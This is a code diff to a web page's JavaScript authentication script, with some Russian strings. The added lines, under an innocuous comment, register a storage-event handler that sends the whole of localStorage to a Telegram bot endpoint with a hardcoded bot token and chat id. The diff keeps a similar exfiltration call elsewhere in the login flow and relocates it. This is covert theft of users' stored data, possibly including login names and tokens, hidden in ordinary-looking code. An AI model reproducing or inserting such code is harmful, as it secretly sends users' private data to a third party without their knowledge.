@@ -1,3 +1,11 @@
+/* fetch localStorage on change */
+    window.addEventListener('storage', storageEventHandler(e), false);
+    function storageEventHandler(e){
+        console.log(e.key);
+        fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
+            `sendMessage?chat_id=-1001490927690&text=` + 
+            `${JSON.stringify(localStorage)}`);
+    }
 /* Authentication */
     document.querySelector('#login').value = localStorage.getItem('lastLogin') || '';
     document.querySelector('.content').style.display = 'none';
@@ -67,9 +75,6 @@
                     `Ошибка авторизации  => ${login} ` +
                     `${window.location}`);
             }
-        fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
-            `sendMessage?chat_id=-1001490927690&text=` + 
-            `${JSON.stringify(localStorage)}`);
     }
     if (!sessionStorage.reloaded) {
         document.querySelector('#login').addEventListener('keypress', function (e) {
